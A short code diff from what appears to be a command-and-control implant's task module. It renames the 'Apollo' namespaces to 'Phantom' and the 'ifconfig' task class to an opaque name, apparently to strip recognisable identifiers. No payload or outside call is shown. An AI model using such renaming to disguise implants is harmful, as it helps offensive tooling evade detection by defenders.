@@ -6,9 +6,9 @@
 
 #if IFCONFIG
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Net;
@@ -46,7 +46,7 @@ namespace Tasks
         public string DynamicDnsEnabled { get; set; }
     }
     
-    public class ifconfig : Tasking
+    public class CipherMonitor49C0 : Tasking
     {
         private List<InterfaceConfiguration> _interfaces = new List<InterfaceConfiguration>();
         
